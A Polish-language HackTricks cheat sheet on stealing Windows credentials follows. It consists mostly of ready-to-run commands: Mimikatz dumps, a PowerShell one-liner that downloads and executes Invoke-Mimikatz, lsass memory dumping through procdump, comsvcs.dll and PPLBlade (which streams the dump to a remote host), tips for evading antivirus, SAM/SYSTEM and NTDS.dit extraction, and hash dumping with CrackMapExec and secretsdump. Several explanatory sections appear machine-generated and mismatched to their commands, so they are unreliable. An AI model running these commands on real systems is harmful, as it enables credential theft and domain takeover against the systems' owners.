# Kradzież poświadczeń systemu Windows

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytoriów** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Mimikatz - Kradzież poświadczeń
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się tutaj o niektórych możliwych zabezpieczeniach danych uwierzytelniających.**](credentials-protections.md) **Te zabezpieczenia mogą zapobiec wydobyciu niektórych danych uwierzytelniających przez Mimikatz.**

## Dane uwierzytelniające z Meterpreter

Użyj [**wtyczki Credentials**](https://github.com/carlospolop/MSF-Credentials), **którą stworzyłem, aby przeszukać ofiarę w poszukiwaniu haseł i skrótów**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump od** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoftu**, nie jest wykrywany przez Defendera.\
Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wydobycia** danych **uwierzytelniających lokalnie** z zrzutu.

{% code title="Zrzut lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Wyodrębnianie poświadczeń z dumpa" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą **wykryć** jako **szkodliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ wykrywają ciągi **"procdump.exe" i "lsass.exe"**. Dlatego jest **bardziej skryte** przekazać jako **argument** PID lsass.exe do procdump **zamiast** nazwy lsass.exe.

### Zrzucanie lsass za pomocą **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll** znajdująca się w `C:\Windows\System32` jest odpowiedzialna za **zrzucanie pamięci procesu** w przypadku awarii. Ta biblioteka DLL zawiera funkcję o nazwie **`MiniDumpW`**, która jest uruchamiana za pomocą `rundll32.exe`.\
Pierwsze dwa argumenty są nieistotne, ale trzeci argument składa się z trzech składników. Pierwszy składnik to identyfikator procesu, który ma zostać zrzutowany, drugi składnik to lokalizacja pliku zrzutu, a trzeci składnik to wyłącznie słowo **full**. Nie istnieją żadne alternatywne opcje.\
Po analizie tych trzech składników biblioteka DLL tworzy plik zrzutu i przenosi pamięć określonego procesu do tego pliku.\
Wykorzystanie biblioteki **comsvcs.dll** jest możliwe do zrzucania procesu lsass, eliminując tym samym konieczność przesyłania i uruchamiania procdump. Metoda ta jest szczegółowo opisana pod adresem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Do wykonania używane jest następujące polecenie:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ten proces można zautomatyzować za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Wykonywanie zrzutu lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy na pasku zadań i wybierz Menedżer zadań.
2. Kliknij na "Więcej szczegółów".
3. W zakładce Procesy wyszukaj proces "Local Security Authority Process".
4. Kliknij prawym przyciskiem myszy na procesie "Local Security Authority Process" i wybierz "Utwórz plik zrzutu".

### Wykonywanie zrzutu lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, który jest częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpowanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do dumpowania chronionych procesów, które obsługuje zaciemnianie dumpów pamięci i przesyłanie ich na zdalne stanowiska robocze bez zapisywania ich na dysku.

**Główne funkcje**:

1. Omijanie ochrony PPL
2. Zaciemnianie plików dumpu pamięci w celu uniknięcia wykrycia przez mechanizmy sygnatur antywirusowych Defendera
3. Przesyłanie dumpu pamięci za pomocą metod RAW i SMB bez zapisywania go na dysku (bezplikowy dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Wydobywanie haszy SAM

CrackMapExec to narzędzie do testowania penetracyjnego, które można użyć do wydobywania haszy z bazy danych SAM w systemach Windows. Hasze SAM są przechowywane lokalnie na komputerze i zawierają uwierzytelnienie użytkowników systemu. Wydobywanie tych haszy może umożliwić złamanie haseł i uzyskanie dostępu do kont użytkowników. Aby wydobyć hasze SAM za pomocą CrackMapExec, wykonaj następujące kroki:

1. Uruchom CrackMapExec na swoim systemie.
2. Użyj polecenia `cme smb <target> -u <username> -p <password>` do nawiązania połączenia z docelowym systemem za pomocą protokołu SMB.
3. Wykonaj polecenie `hashdump` w celu wydobywania haszy SAM z systemu.
4. Otrzymane hasze można następnie użyć do próby złamania haseł lub do innych celów testowania penetracyjnego.

Wydobywanie haszy SAM jest przydatnym narzędziem w procesie testowania penetracyjnego, ponieważ umożliwia identyfikację słabych haseł i potencjalne podatności w systemach Windows. Pamiętaj jednak, że wydobywanie haszy bez zgody właściciela systemu jest nielegalne i może prowadzić do konsekwencji prawnych. Zawsze przestrzegaj odpowiednich przepisów i zasad etycznych podczas korzystania z narzędzi do testowania penetracyjnego.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Wykradanie sekretów LSA

#### Opis

Wykradanie sekretów LSA (Local Security Authority) to technika polegająca na pozyskiwaniu poufnych informacji przechowywanych w systemie Windows. Sekrety LSA obejmują m.in. hasła użytkowników, klucze szyfrujące, tokeny uwierzytelniające i certyfikaty.

#### Kroki

1. Uruchom narzędzie `mimikatz` na docelowym systemie Windows.

2. Wprowadź polecenie `privilege::debug`, aby uzyskać uprawnienia debugowania.

3. Wykonaj polecenie `sekurlsa::logonpasswords`, aby wyświetlić poufne informacje uwierzytelniania.

4. Zapisz wyświetlone dane, aby móc je przeanalizować później.

#### Uwagi

- Ta technika wymaga uprawnień administratora lub uprawnień debugowania.

- Wykradanie sekretów LSA jest nielegalne i narusza prywatność innych osób. Używaj tej techniki tylko w celach edukacyjnych lub zgodnie z prawem.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Wydobądź plik NTDS.dit z docelowego kontrolera domeny (DC)

Aby wydobędź plik NTDS.dit z docelowego kontrolera domeny (DC), możesz użyć narzędzia `ntdsutil`. Narzędzie to jest wbudowane w systemy Windows Server i umożliwia dostęp do bazy danych Active Directory.

1. Zaloguj się na docelowy kontroler domeny (DC) jako administrator.
2. Otwórz wiersz polecenia jako administrator.
3. Uruchom narzędzie `ntdsutil`, wpisując polecenie `ntdsutil` i naciskając Enter.
4. Wewnątrz narzędzia `ntdsutil`, wpisz polecenie `activate instance ntds` i naciśnij Enter.
5. Następnie wpisz polecenie `ifm` i naciśnij Enter, aby przejść do trybu tworzenia plików instalacyjnych.
6. Wpisz polecenie `create full <ścieżka_do_folderu_docelowego>`, gdzie `<ścieżka_do_folderu_docelowego>` to ścieżka do folderu, w którym chcesz zapisać plik NTDS.dit. Naciśnij Enter, aby rozpocząć proces tworzenia plików instalacyjnych.
7. Po zakończeniu procesu, plik NTDS.dit zostanie wyodrębniony i zapisany w wybranym folderze.

Pamiętaj, że wydobycie pliku NTDS.dit z kontrolera domeny wymaga uprawnień administratora i jest związane z potencjalnymi ryzykami. Wykorzystuj te informacje zgodnie z prawem i tylko w celach, które są zgodne z etycznym testowaniem penetracyjnym.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Wydobądź historię haseł NTDS.dit z docelowego kontrolera domeny (DC)

Aby wydobyć historię haseł NTDS.dit z docelowego kontrolera domeny (DC), wykonaj następujące kroki:

1. Uruchom narzędzie `ntdsutil` na docelowym DC.
2. Wpisz polecenie `activate instance ntds`.
3. Następnie wpisz polecenie `ifm`.
4. Wybierz katalog docelowy, w którym chcesz zapisać skopiowane pliki.
5. Wpisz polecenie `create full C:\path\to\output\folder`.
6. Poczekaj, aż proces kopiowania zostanie zakończony.
7. Przejdź do katalogu, w którym zapisałeś skopiowane pliki.
8. Otwórz plik `ntds.dit` przy użyciu narzędzia `esedbexport`.
9. Wydobądź historię haseł, korzystając z narzędzia `dsusers.py` lub innego narzędzia do analizy bazy danych NTDS.dit.

Pamiętaj, że wydobycie historii haseł NTDS.dit z docelowego DC wymaga uprawnień administratora.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta NTDS.dit

Aby wyświetlić atrybut pwdLastSet dla każdego konta NTDS.dit, wykonaj następujące kroki:

1. Otwórz wiersz polecenia jako administrator.
2. Uruchom narzędzie `ntdsutil`, wpisując `ntdsutil` i naciskając Enter.
3. Wprowadź polecenie `activate instance ntds`, a następnie naciśnij Enter.
4. Wprowadź polecenie `ifm`, a następnie naciśnij Enter.
5. Wprowadź polecenie `create full C:\path\to\destination`, gdzie `C:\path\to\destination` to ścieżka do miejsca, w którym chcesz zapisać pliki NTDS.dit i SYSTEM.
6. Po zakończeniu procesu tworzenia kopii zapasowej, wprowadź polecenie `quit`, a następnie naciśnij Enter.
7. Wprowadź polecenie `quit`, a następnie naciśnij Enter, aby wyjść z narzędzia `ntdsutil`.
8. Przejdź do miejsca, w którym zapisałeś pliki NTDS.dit i SYSTEM.
9. Uruchom narzędzie `esedbexport`, wpisując `esedbexport ntds.dit`, a następnie naciskając Enter.
10. Wyświetl atrybut pwdLastSet dla każdego konta NTDS.dit, wykonując polecenie `dsquery * -filter "(objectCategory=Person)" -attr pwdLastSet`.

Teraz będziesz mógł zobaczyć atrybut pwdLastSet dla każdego konta NTDS.dit.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kradzież plików SAM i SYSTEM

Te pliki powinny być **znajdują się** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Jednak **nie możesz ich po prostu skopiować w standardowy sposób**, ponieważ są one chronione.

### Z rejestru

Najprostszym sposobem na kradzież tych plików jest skopiowanie ich z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoje urządzenie Kali i **wyodrębnij hashe** za pomocą:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Kopiowanie woluminu cieni

Możesz wykonać kopię chronionych plików za pomocą tej usługi. Musisz być administratorem.

#### Używanie vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach systemu Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale to samo można zrobić za pomocą **Powershell**. Oto przykład **jak skopiować plik SAM** (dysk twardy używany to "C:" i jest zapisywany w C:\users\Public), ale można to zastosować do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Ostatecznie, można również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię plików SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Aktywne poświadczenia Active Directory - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory** i przechowuje kluczowe dane dotyczące obiektów użytkowników, grup i ich przynależności. To tutaj przechowywane są **hasze haseł** dla użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Tabela danych**: Ta tabela przechowuje szczegóły dotyczące obiektów, takich jak użytkownicy i grupy.
- **Tabela powiązań**: Śledzi relacje, takie jak przynależność do grupy.
- **Tabela SD**: Tutaj przechowywane są deskryptory zabezpieczeń dla każdego obiektu, zapewniające bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Więcej informacji na ten temat: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

System Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on używany przez _lsass.exe_. Część pliku **NTDS.dit** może znajdować się **w pamięci `lsass`** (można znaleźć najnowsze dane dostępne prawdopodobnie ze względu na poprawę wydajności za pomocą **pamięci podręcznej**).

#### Odszyfrowywanie haszy wewnątrz NTDS.dit

Hasz jest szyfrowany 3 razy:

1. Odszyfrowanie klucza szyfrowania hasła (**PEK**) za pomocą **BOOTKEY** i **RC4**.
2. Odszyfrowanie **hasza** za pomocą **PEK** i **RC4**.
3. Odszyfrowanie **hasza** za pomocą **DES**.

**PEK** ma **tą samą wartość** na **każdym kontrolerze domeny**, ale jest **szyfrowany** wewnątrz pliku **NTDS.dit** za pomocą **BOOTKEY** z pliku **SYSTEM kontrolera domeny (różni się między kontrolerami domeny)**. Dlatego aby uzyskać poświadczenia z pliku NTDS.dit, **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiowanie NTDS.dit za pomocą narzędzia Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz również użyć sztuczki z [**kopią woluminu cieni**](./#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**wydobądź go z rejestru lub użyj sztuczki z kopią woluminu cieni**](./#stealing-sam-and-system)).

### **Wydobywanie hashy z pliku NTDS.dit**

Gdy już **uzyskasz** pliki **NTDS.dit** i **SYSTEM**, możesz użyć narzędzi takich jak _secretsdump.py_, aby **wydobyć hashy**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz również **wydobyć je automatycznie** za pomocą ważnego użytkownika administratora domeny:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się ich wyodrębnienie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Ostatecznie, można również użyć modułu **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z pliku NTDS.dit do bazy danych SQLite**

Obiekty NTDS mogą być wyodrębniane do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko tajemnice, ale także całe obiekty i ich atrybuty, co umożliwia dalsze wyodrębnianie informacji, gdy już uzyskano surowy plik NTDS.dit.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive jest opcjonalny, ale umożliwia odszyfrowanie sekretów (haszów NT i LM, uzupełniających poświadczeń, takich jak hasła w czystym tekście, kluczy kerberos lub zaufania, historii haseł NT i LM). Oprócz innych informacji, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich haszami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne przynależności, drzewo jednostek organizacyjnych i przynależność, zaufane domeny z typem, kierunkiem i atrybutami zaufania...

## Lazagne

Pobierz binarny plik stąd [tutaj](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębnienia poświadczeń z różnych oprogramowań.
```
lazagne.exe all
```
## Inne narzędzia do wydobywania poświadczeń z plików SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie można użyć do wydobycia poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wydobywaj poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz go z: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) i po prostu **uruchom** go, a hasła zostaną wyodrębnione.

## Obrona

[**Dowiedz się tutaj o niektórych zabezpieczeniach danych uwierzytelniających.**](credentials-protections.md)

<details>

<summary><strong>Dowiedz się o hakowaniu AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
